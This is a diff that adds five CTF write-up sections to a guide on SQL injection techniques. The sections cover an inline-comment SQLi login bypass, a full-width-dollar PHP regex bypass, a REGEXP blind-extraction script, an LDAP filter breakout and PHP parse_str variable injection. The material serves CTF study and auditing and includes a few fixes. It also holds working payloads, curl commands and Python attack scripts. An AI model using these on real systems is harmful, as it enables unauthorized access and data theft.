@@ -24,6 +24,11 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
 - [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
 - [MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)](#mysql-innodb_table_stats-as-information_schema-alternative-n1ctf-2018)
+- [SQLi Inline Comment Multi-Field Split (picoCTF 2018)](#sqli-inline-comment-multi-field-split-picoctf-2018)
+- [PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)](#php-full-width-dollar-regex-anchor-bypass-hacklu-ctf-2018)
+- [MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)](#mysql-regexp-byte-by-byte-oracle--backtick-comment-bypass-bsides-delhi-2018)
+- [LDAP Filter Breakout with Wildcard Injection (CSAW 2018)](#ldap-filter-breakout-with-wildcard-injection-csaw-2018)
+- [PHP parse_str() Variable Injection (TokyoWesterns 2018)](#php-parse_str-variable-injection-tokyowesterns-2018)
 
 ---
 
@@ -571,5 +576,148 @@ print(f"Tables: {tables}")
 ```
 
 **Key insight:** `mysql.innodb_table_stats` contains `database_name` and `table_name` columns, providing an alternative metadata source when `information_schema` access is filtered by WAF rules. Unlike `information_schema`, it only tracks InnoDB tables (not column names), so combine with error-based or blind techniques to discover column names after finding tables.
+
+---
+
+## SQLi Inline Comment Multi-Field Split (picoCTF 2018)
+
+**Pattern:** A regex filter checks the username field but leaves the password field unfiltered. Start a MySQL inline comment `/*` in username and close it `*/` in password, splitting the injection across two fields so no single field triggers the filter alone.
+
+```text
+# Vulnerable query (after PHP concatenation):
+SELECT * FROM users WHERE name='<username>' AND password='<password>'
+
+# Payload:
+username = '/*
+password = */ OR 1=1 --
+
+# Final query MySQL sees:
+SELECT * FROM users WHERE name='/*' AND password='*/ OR 1=1 -- '
+# After comment removal:
+SELECT * FROM users WHERE name=' OR 1=1 -- '
+```
+
+```python
+import requests
+r = requests.post("http://target/login", data={
+    "username": "'/*",
+    "password": "*/ OR 1=1 -- "
+})
+```
+
+**Key insight:** MySQL `/* ... */` comments span across string delimiters and field boundaries when the filter runs before interpolation, not after. Any validator that checks one field at a time misses the full injected string. When a blocklist hits the username regex but the password field is rendered into the same query, split payloads across both inputs.
+
+**References:** picoCTF 2018 — THE VAULT, writeup 11747
+
+---
+
+## PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)
+
+**Pattern:** PHP regex `/^\d+＄/` uses the Unicode full-width dollar sign (`＄`, U+FF04) instead of ASCII `$`. PCRE treats the full-width character as a literal, so there is no end-of-string anchor and the match succeeds even with trailing garbage.
+
+```php
+// Vulnerable check
+if (preg_match('/^\d+＄/', $input)) { /* accepted */ }
+
+// Payload passes validation and later triggers long-string handling
+$_GET['key2'] = '1337＄' . str_repeat('a', 50);
+```
+
+```bash
+curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
+```
+
+**Key insight:** Always compare regex special characters by codepoint, not by appearance. Unicode look-alikes of `$`, `^`, `.`, `[`, `]`, `*`, `+`, `?`, `(`, `)` are literals in PCRE and silently downgrade the pattern. Check every anchor in a filter with `hexdump -C` before trusting it.
+
+**References:** Hack.lu CTF 2018 — Baby PHP, writeup 11846
+
+---
+
+## MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)
+
+**Pattern:** WAF blocks `|`, `-`, `\`, `#`, `and`, `if`, `where`, `concat`, `insert`, `having`, and `sleep`, but leaves `REGEXP` and backtick identifiers alone. Use backtick-delimited comments `/**/` as space replacement and `REGEXP` as a Boolean oracle that matches an anchored prefix character-by-character. A trailing null byte terminates the query in old PHP/MySQL pairs and drops the surrounding single-quote.
+
+```text
+# Blacklist (partial): | - \ ( ) # and if database where concat insert having sleep
+
+# Oracle query:
+/?user=`\`&pw=`||pw/**/REGEXP/**/%22^1%22;%00
+
+# Iteratively extend the regex prefix:
+^1 → ^17 → ^172 → ^1729 ...
+```
+
+```python
+import requests, string
+URL = "http://target/"
+prefix = ""
+charset = string.ascii_letters + string.digits + "{}_"
+while True:
+    for c in charset:
+        pw = f"`||pw/**/REGEXP/**/\"^{prefix+c}\";\x00"
+        r = requests.get(URL, params={"user": "`\\`", "pw": pw})
+        if "Welcome" in r.text:
+            prefix += c
+            print(prefix)
+            break
+    else:
+        break
+```
+
+**Key insight:** `REGEXP` is rarely on a WAF keyword list and supports anchors (`^`, `$`) and character classes, giving a full byte-by-byte oracle without `AND`, `IF`, or `SUBSTRING`. Backticked column references bypass space stripping because `/**/` comments separate tokens without spaces. Null bytes after the payload truncate the SQL string early in MySQL clients that still honor embedded NULs.
+
+**References:** BSides Delhi CTF 2018 — Old School SQL, writeup 11953
+
+---
+
+## LDAP Filter Breakout with Wildcard Injection (CSAW 2018)
+
+**Pattern:** An LDAP search filter `(&(GivenName=<input>)(!(GivenName=Flag)))` interpolates user input without escaping parentheses or wildcards. Inject `*))(|(uid=*` to close the first clause, open a disjunction, and match every entry — including the blocked `Flag` account.
+
+```text
+# Original filter
+(&(GivenName=Alice)(!(GivenName=Flag)))
+
+# Injected input: *))(|(uid=*
+# Resulting filter
+(&(GivenName=*))(|(uid=*)(!(GivenName=Flag)))
+
+# The `&` now only sees (GivenName=*), and the trailing disjunction + leftover
+# negation become ignored extra filter components.
+```
+
+```python
+import requests
+r = requests.get("http://target/search", params={"name": "*))(|(uid=*"})
+print(r.text)
+```
+
+**Key insight:** LDAP filters use a prefix-notation boolean tree: `&` / `|` / `!` followed by parenthesised children. Unescaped user input that contains `)`, `(`, `*`, or `\` lets the attacker rebalance that tree. Common payloads: `*)(uid=*` (OR wildcard), `*))(&(1=1)` (force true), `foo)(|(password=*)`  (enumerate records). Escape with `\28`, `\29`, `\2a`, `\5c` on the server side.
+
+**References:** CSAW CTF Qualification Round 2018 — ldab, writeup 11207
+
+---
+
+## PHP parse_str() Variable Injection (TokyoWesterns 2018)
+
+**Pattern:** PHP's `parse_str($str)` — called without a result array — writes every key in the query string as a local variable in the current scope. Attacker-controlled keys overwrite authentication variables such as `$hashed_password` that the script compares against a precomputed hash.
+
+```php
+// Vulnerable
+parse_str($_SERVER['QUERY_STRING']);  // $hashed_password ← attacker input
+if (md5($password) === $hashed_password) { login(); }
+
+// Safe form
+parse_str($_SERVER['QUERY_STRING'], $params);
+```
+
+```bash
+# Set the target variable directly from the query string
+curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php -r 'echo md5("anything");')"
+```
+
+**Key insight:** `parse_str()` and `extract()` are register_globals-style primitives: any parameter sent by the client becomes a PHP variable that might shadow logic the developer assumed was local. The fix is always the two-argument form. When auditing PHP, grep for `parse_str\(\s*\$[^,]*\)` with no comma.
+
+**References:** TokyoWesterns CTF 4th 2018 — SimpleAuth, writeup 11034
 
 ---
